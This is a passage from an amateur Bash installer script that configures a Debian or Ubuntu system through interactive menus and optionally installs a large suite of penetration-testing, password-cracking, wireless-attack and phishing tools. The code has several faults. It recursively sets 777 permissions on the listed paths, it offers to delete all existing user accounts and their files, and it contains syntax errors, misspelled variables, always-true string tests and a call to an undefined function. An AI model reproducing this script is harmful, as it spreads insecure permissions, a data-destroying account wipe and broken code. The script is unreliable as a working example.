		apt-get install -y --force-yes icecat-it 1> /dev/null 2> $LOG
	fi

	if [ $proxy == $proxycho ]; then
		f_proxy_buntu_debian
	fi

	if [ $servercho == $serverfull ]; then
		f_apache_buntu_debian
		if [ $gui != $nogui ]; then
			if [ $pentestcho == $pentest ]; then
				f_xplico_buntu_debian
			fi
		fi
		f_php5_buntu_debian
		f_sqlite3_buntu_debian
		f_mysql_buntu_debian
		f_samba_buntu_debian
		f_ssh_server_buntu_debian
		f_ftp_server_buntu_debian
		f_telnet_server_buntu_debian
		f_cups_buntu_debian
		f_vnc_buntu_debian
	fi
	if [ $servercho == $serverlittle ]; then
		f_sqlite3_buntu_debian
		if [ $pentestcho == $pentest ]; then
			f_mysql_buntu_debian
		fi
		f_samba_buntu_debian
		f_ftp_client_buntu_debian
		f_ssh_client_buntu_debian
		f_telnet_client_buntu_debian
	fi


	if [ $gui != $nogui ]; then
		if [ $composite == $nvidia ] || [ $composite == $ati ]; then
			f_awn_buntu_debian
			cd $HOME
			mkdir -p .config
			cd .config
			mkdir -p awn
			cd awn
			mkdir launchers
			cd $HOME
			if [ $gui == $openboxstand ]; then
				( cp /usr/share/applications/tint2menu.desktop $HOME/.config/awn/launchers/tint2menu.desktop ) &
			fi
			if [ $webchoice=$midori ]; then
				( cp /usr/share/applications/midori.desktop $HOME/.config/awn/launchers/midori.desktop ) &
			fi
			if [ $webchoice=$firefox ]; then
				( cp /usr/share/applications/firefox-trunk.desktop $HOME/.config/awn/launchers/firefox-trunk2.desktop ) &
				cat $HOME/.config/awn/launchers/firefox-trunk2.desktop | sed -e 's|Exec=firefox-trunk %u|Exec=firefox-trunk --private-toggle %u|' >> $HOME/.config/awn/launchers/firefox-trunk.desktop
				rm -f $HOME/.config/awn/launchers/firefox-trunk2.desktop
			fi
			if [ $webchoice=$icecat ]; then
				( cp /usr/share/applications/icecat.desktop $HOME/.config/awn/launchers/icecat.desktop ) &
			fi
			if [ $webchoice == $chromium ]; then
				( cp /usr/share/applications/chromium-browser.desktop $HOME/.config/awn/launchers/chromium-browser2.desktop ) &
				cat $HOME/.config/awn/launchers/chromium-browser2.desktop | sed -e 's|Exec=\/usr\/bin\/chromium-browser %U|Exec=\/usr\/bin\/chromium-browser --incognito|' >> $HOME/.config/awn/launchers/chromium-browser.desktop
				rm -f $HOME/.config/awn/launchers/chromium-browser2.desktop
			fi
			if [ $webchoice=$opera ]; then
				( cp /usr/share/applications/opera.desktop $HOME/.config/awn/launchers/opera.desktop ) &
			fi
			if [ $gui == $gnome ]; then
				( cp /usr/share/applications/nautilus-browser.desktop $HOME/.config/awn/launchers/nautilus-browser.desktop ) &
			fi
			if [ $gui == $kde ]; then
				( cp /usr/share/applications/Thunar.desktop $HOME/.config/awn/launchers/thunar.desktop ) &
			elif [ $gui == $gnome[; then
				( cp /usr/share/applications/nautilus-browser.desktop $HOME/.config/awn/launchers/nautilus-browser.desktop ) &
			else
				( cp /usr/share/applications/Thunar.desktop $HOME/.config/awn/launchers/thunar.desktop ) &
			fi
			( cp /usr/share/applications/roxterm.desktop $HOME/.config/awn/launchers/roxterm.desktop ) &
			( cp /usr/share/applications/gnome-mplayer.desktop $HOME/.config/awn/launchers/gnome-mplayer.desktop ) &
			( cp /usr/share/applications/amsn.desktop $HOME/.config/awn/launchers/amsn.desktop ) &
			( cp /usr/share/applications/amule.desktop $HOME/.config/awn/launchers/amule.desktop ) &
			( cp /usr/share/applications/frostwire.desktop $HOME/.config/awn/launchers/frostwire.desktop ) &
			( cp /usr/share/applications/geany.desktop $HOME/.config/awn/launchers/geany.desktop ) &
		fi
	fi

	if [ $pentestcho == $pentestactive ]; then
		clear
		if [ $composite == $nvidia ]; then
			f_aircrack_ng_cuda
		fi
		if [ $composite == $ati ] || [ $composite == $nocomposite ]; then
			f_aircrack_ng
		fi
		f_airoscript
		f_brutessh
		f_catdoc
		f_cewl_buntu_debian
		f_chntpw
		f_cowpatty
		if [ $composite == $nvidia ]; then
			f_crark
		fi
		f_creepy
		f_crunch
		if [ $composite == $nvidia ]; then
			f_cudamultiforcer
		fi
		f_database
		f_dcrack
		f_driftnet_buntu_debian
		f_dsniff_buntu_debian
		if [ $gui == $nogui ]; then
			f_ettercap_debian_command
		fi
		if [ $gui != $nogui ]; then
			f_ettercap_debian_gui
		fi
		f_evilmaid
		f_exiftool
		f_exploit_db
		f_fern_wifi_cracker
		f_geoedge
		f_ghost_pisher
		f_ham_ferr
		f_harvester
		f_hashcat_cpu
		if [ $gui != $nogui ]; then
			f_hashcat_cpu_gui
		fi
		if [ $composite == $nvidia ] || [ $composite == $ati ]; then
			f_hashcat_ocl_lite
			f_hashcat_ocl_plus
		fi
		if [ $gui != $nogui ]; then
			f_hexor_base
		fi
		f_html2text
		f_hydra
		f_id3V2
		if [ $gui != $nogui ]; then
			f_inguma
		fi
		if [ $composite == $nvidia ] || [ $composite == $ati ]; then
			f_john_opencl
		fi
		if [ $composite == $nocomposite ]; then
			f_john
		fi
		f_leetify
		if [ $gui == $nogui [; then
			f_macchanger_command
		fi
		if [ $gui != $nogui [; then
			f_macchanger_gui_buntu_debian
		fi
		if [ $gui != $nogui ]; then
			f_mantra
		fi
		f_mask_processor
		if [ $gui != $nogui ]; then
			f_mediainfo_buntu_debian
		fi
		f_medusa_buntu_debian
		f_metasploit_buntu_debian
		f_netcat_buntu_debian
		f_netdiscover
		f_nitko
		f_nmap
		if [ $gui != $nogui ]; then
			f_openvas_buntu_debian
		fi
		f_p0f
		f_pdfcrack
		f_pdftotext
		if [ $gui != $nogui ]; then
			f_pyloris
		fi
		if [ $composite == $nvidia ]; then
			f_pyrit_cuda
		fi
		if [ $composite == $ati ]; then
			f_pyrit_callpp
		fi
		if [ $composite == $nocomposite ]; then
			f_pyrit
		fi
		f_rarcrack
		f_reaver_wps
		if [ $gui != $nogui ]; then
			f_set
		fi
		f_sslstrip
		f_uniofuzz
		f_w3af
		f_wifite
		if [ $gui != $nogui ]; then
			f_wireshark_buntu_debian
		fi
		f_wyd
	fi

	f_darkeffe

	f_copyscripts

	clear

	f_clean

	clear

}

# Arch
f_arch () {
	echo "In development"
	sleep 3
	f_menu
}

# Gentoo
f_gentoo () {
	echo "In development"
	sleep 3
	f_menu
}

#==============================================================================================================================#


# Menu
f_menu () {

rm -f /darkuntu.sh
cp $0 /darkuntu.sh

clear

# Distribution
f_menu_distribution () {

os=30
buntu=1
debian=2
gentoo=3
arch=4
until [ $os == $buntu ] || [ $os == $debian ] || [ $os == $gentoo ] || [ $os == $arch ]; do
	clear
	echo " Select The Distribution In Use : "
	echo ""
	echo "1) *Buntu"
	echo "2) Debian"
	echo "3) Gentoo"
	echo "4) Arch"
	echo ""
	echo -en "Selection : "
	read os
done

}

f_menu_distribution

# Gui
f_menu_gui () {

gui=0
nogui=1
gnome=2
kde=3
xfce=4
lxde=5
enlight=6
openboxstand=7
until [ $gui == $nogui ] || [ $gui == $gnome ] || [ $gui == $kde ] || [ $gui == $xfce ] || [ $gui == $lxde ] || [ $gui == $enlight ] || [ $gui == $openboxstand ]; do
	clear
	echo "Select The Desktop Manager : "
	echo ""
	echo "1) No Graphical Interface"
	echo "2) Gnome"
	echo "3) Kde"
	echo "4) Xfce"
	echo "5) Lxde"
	echo "6) Enlightment"
	echo "7) Openbox Standalone"
	echo ""
	echo -en "Selection : "
	read gui
done

}

f_menu_gui

# Graphic Card
f_menu_graphic_card () {

composite=0
nvidia=1
ati=2
nocomposite=3
until [ $composite == $nvidia ] || [ $composite == $ati ] || [ $composite == $nocomposite ]; do
	clear
	echo "Graphic Card Selection : "
	echo ""
	echo "1) Nvidia  (CompositeManager | Cuda | Opencl | Crarck | Cuda-Multiforcer | Aircrack-ng-cuda | Pyrit-cuda | OclHashcat)"
	echo "2) Ati (CompositeManager | Opencl | Pyrit-opencl | OclHashcat)"
	echo "3) NO Dedicate Video Card"
	echo ""
	echo -n " Enter Choice : "
	read composite
done

}

f_menu_graphic_card

# Compiz
f_menu_compiz () {

if [ $composite != $nocomposite ]; then
	if [ $gui != $nogui ] || [ $gui != $openboxstand ]; then
		clear
		echo "To Install Compiz Composite Manager, tape yes, else any other key"
		echo -n "(Not Recomended With Kde) : "
		read compiz
	fi
fi

}

f_menu_compiz

# WebBrowser
f_menu_webbrowser () {

if [ $gui != $nogui ]; then
	webchoice=6
	midori=1
	firefox=2
	icecat=3
	chromium=4
	opera=5
	until [ $webchoice == $midori ] || [ $webchoice == $firefox ] || [ $webchoice == $icecat ] || [ $webchoice == $chromium ] || [ $webchoice == $opera ]; do
		clear
		echo "Selezione Webbrowser : "
		echo ""
		echo "1) Midori"
		echo "2) Firefox / Iceweasel"
		echo "3) Icecat"
		echo "4) Chromium"
		echo "5) Opera"
		echo ""
		echo -n " Select a operation from the menu: "
		read webchoice
	done
fi

}

f_webbrowser

# Audio Player
f_menu_audioplayer () {

if [ $gui != $nogui ]; then
	audioplcho=54
	amarok=1
	audacious=2
	clementine=3
	exaile=4
	rhythmbox=5
	until [ $audioplcho == $amarok ] || [ $audioplcho == $audacious ] || [ $audioplcho == $clementine ] || [ $audioplcho == $exaile ] || [ $audioplcho == $rhythmbox ]; do
		clear
		echo "Select Your Favorite AudioPlayer : "
		echo
		echo "1) Amarok (Sugested for KDE)"
		echo "2) Audacious"
		echo "3) Clementine"
		echo "4) Exaile"
		echo "5) Rhythmbox (Sugested For GNOME)"
		echo ""
		echo -en "Selection : "
		read audioplcho
	done
fi

}

f_menu_audioplayer

# Firewall
f_menu_firewall () {

firewall=0
activeclient=1
activeserver=2
disactive=3
until [ $firewall == $activeclient ] || [ $firewall == $activeserver ] || [ $firewall == $disactive ]; do
	clear
	echo "Firewall  (You find it in /opt/darkeffe/firewall.sh) : "
	echo ""
	echo "1) Active Client Version"
	echo "2) Active Server Version"
	echo "3) Disactive"
	echo ""
    echo -n "Select an operation from the menu: "
    read firewall
done

}

f_menu_firewall

# Server
f_menu_server () {

servercho=0
serverfull=1
serverlittle=2
until [ $servercho == $serverfull ] || [ $servercho == $serverlittle ]; do
	clear
	echo "Selezione Opzione Server : "
	echo "1) Server Full    ----->> Apache + Xplico + PHP5 + MySql + Samba + Ssh(server+client) + Ftp(server+client) + VNC"
	echo "                          [ Needed For Pentesting ]"
	echo "2) Server Little  ----->> MySql + Samba + Ssh(client) + Ftp(client)"
	echo ""
	echo -n "Select a operation from the menu: "
	read servercho
done

}

f_menu_server

# Pentest
f_menu_pentest () {

pentestcho=0
pentestactive=1
pentestdisactive=2
until [ $pentestcho == $pentestactive ] || [ $pentestcho == $pentestdisactive ]; do
	clear
	echo "Pentest Software Selection : "
	echo  ""
	echo "1) Install Pentest Software : "
	echo "2) If You Don't Wanna To Install Pentest Software "
	echo ""
	echo -en "Choice : "
	read pentestcho
done

}

f_menu_pentest

# Proxy
f_menu_proxy () {

proxycho=0
proxyactive=1
proxydisactive=2
until [ $proxycho == $proxyactive ] || [ $proxycho == $proxydisactive ]; do
	clear
	echo "Proxy Selection : "
	echo ""
	echo "1) Install Tor, Privoxy and Proxychains to anonimize yourself : "
	echo "2) If You don't wanna to anonimize yourself "
	echo ""
	echo -en "Choice : "
	read proxycho
done

}

f_menu_proxy

# Music Server
f_menu_music_server () {

music=0
alsa=1
pulse=2
jackal=3
jackpu=4
until [ $music == $alsa ] || [ $music == $pulse ] [ $music == $jackal ] || [ $music == $jackpu ]; do
	clear
	echo "Select Your Music Server (In dubt, select Alsa) : "
	echo
	echo "1) Alsa "
	echo "2) PulseAudio "
	echo "3) Jack + Alsa "
	echo "4) Jack + Pulse "
	echo ""
	echo -en "Music Server Choice : "
	read music
done

}

f_menu_music_server

# Account
f_menu_account () {

root=1
noonroot=2
accountcho=0
until [ $accountcho == $root ] || [ $accountcho == $nootroot ]; do
	clear
	echo "Select The Account(s) Type : "
	echo
	echo "1) Root "
	echo "2) Non Root "
	echo ""
	echo -n "Choice : "
	read accountcho
done

if [ $accountcho == $root ]; then
	passwd root   # Abilitate Login With Root Privilegies
	home="/root"
fi

if [ $accountcho == $nootroot ]; then
	echo -n "Insert The UserName : "
	read username
	echo ""
	adduser $username # user creation
	home="/home/$username"
	mkdir -p $home
fi

clear

echo -n "If You Wanna Delete All Previous Account Enter 1 : "
read delete

if [ $delete == "1" ]; then
	for i in ${user}
	do
		echo -n "Deletting $i ...  "
		deluser $i 1> /dev/null 2> $LOG
		rm -fr $i
		echo "done !!!"
		echo ""
	done
fi

}

f_menu_account

clear

if [ $os == $buntu ]; then
	f_buntu
fi

if [ $os == $debian ]; then
	f_debian
fi

if [ $os == $arch ]; then
	f_arch
fi

if [ $os == $gentoo ]; then
	f_gentoo
fi

# Adjusting Permissions
f_adjusting_permission () {

clear

echo "#############################################"
echo "Adjusting Permissions ..."
echo "#############################################"

readfile=$( cat /root/file )

for c in ${readfile}
do
	if [ -e ${c} ]; then
		echo "[*] $c"
		chmod -R 777 $c 1> /dev/null
		if [ ${accountcho} == ${root} ]; then
			chown -hR root $c 1> /dev/null 2> $LOG
		fi
		if [ ${accountcho} != ${root} ]; then
			chown -hR $username $c 1> /dev/null 2> $LOG
		fi
	fi
done

#rm -f $file

}

f_adjusting_permission

exit 0

}

f_menu
